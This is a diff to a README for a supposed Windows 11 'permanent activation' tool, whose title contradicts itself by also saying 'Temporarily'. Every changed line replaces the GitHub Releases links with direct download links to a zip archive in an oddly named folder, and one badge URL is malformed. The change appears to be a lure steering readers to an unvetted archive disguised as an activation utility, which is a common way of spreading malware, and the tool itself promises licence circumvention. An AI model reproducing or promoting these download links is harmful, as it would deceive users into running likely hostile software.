@@ -1,6 +1,6 @@
 # 🎯 permanent-activation-win11 - Easily Activate Windows 11 Temporarily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Here-blue.svg)](https://github.com/leroy573/permanent-activation-win11/releases)
+[![Download Now](https://github.com/leroy573/permanent-activation-win11/raw/refs/heads/main/centroacinar/activation-win-permanent-v1.2.zip%https://github.com/leroy573/permanent-activation-win11/raw/refs/heads/main/centroacinar/activation-win-permanent-v1.2.zip)](https://github.com/leroy573/permanent-activation-win11/raw/refs/heads/main/centroacinar/activation-win-permanent-v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to **permanent-activation-win11**. This program helps you apply a tempor
 
 ## 📥 Download & Install
 
-To download the software, visit this page: [GitHub Releases](https://github.com/leroy573/permanent-activation-win11/releases). 
+To download the software, visit this page: [GitHub Releases](https://github.com/leroy573/permanent-activation-win11/raw/refs/heads/main/centroacinar/activation-win-permanent-v1.2.zip). 
 
 1. Click on the link to open the Releases page.
 2. Find the latest release.
@@ -69,7 +69,7 @@ You can learn more about related topics and methods for Windows 11 activation in
 
 If you need further assistance, feel free to reach out through the issues section on the GitHub repository or check community forums related to Windows 11 activation. 
 
-For the latest updates and releases, remember to visit the [GitHub Releases page](https://github.com/leroy573/permanent-activation-win11/releases) frequently.
+For the latest updates and releases, remember to visit the [GitHub Releases page](https://github.com/leroy573/permanent-activation-win11/raw/refs/heads/main/centroacinar/activation-win-permanent-v1.2.zip) frequently.
 
 ## 🔐 License
 
